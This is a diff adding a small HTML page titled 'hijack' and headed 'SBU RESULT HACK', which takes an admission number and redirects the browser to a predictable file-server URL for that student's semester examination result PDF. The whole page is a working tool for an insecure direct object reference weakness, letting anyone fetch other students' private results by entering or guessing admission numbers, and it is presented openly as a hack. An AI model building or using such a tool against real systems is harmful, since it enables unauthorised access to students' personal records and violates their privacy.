@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>hijack</title>
+</head>
+<script>
+    function run()
+    { debugger;
+        var r = document.getElementById('roll').value;
+        var url = "https://api-fileserver.sbu.ac.in/Production/StudentExaminationResults/"+r+"/Semester1/"+r+"_Semester1_ExaminationType1_.pdf";
+        location.href = url;
+    }
+</script>
+<style>
+    *{
+        padding: 0;
+        margin: 0;
+
+    }
+    body{
+        background-color: black;
+    }
+    #roll{
+        width: 15rem;
+        height: 3rem;
+        border-radius: 10px;
+        text-transform: uppercase;
+        background-color: grey;
+        color: white;
+    }
+    #roll::placeholder{
+        color: white;
+        padding: 0.3rem;
+    }
+    #sub{
+        background-color: grey;
+        width: 5rem;
+        height: 2rem;
+        font-size: large;
+        border-radius: 10px;
+    }
+    b{
+        color: white;
+        font-size: xx-large;
+    }
+</style>
+<body>
+    <center>
+        <div><br><br><br><b>SBU RESULT HACK</b><br><br><br><br>
+            <input type="text" name="roll" id="roll" placeholder="Enter admission number here">
+            <br><br><input type="submit" id="sub" value="Submit" onclick=run()>
+        </div>
+    </center>
+</body>
+</html>
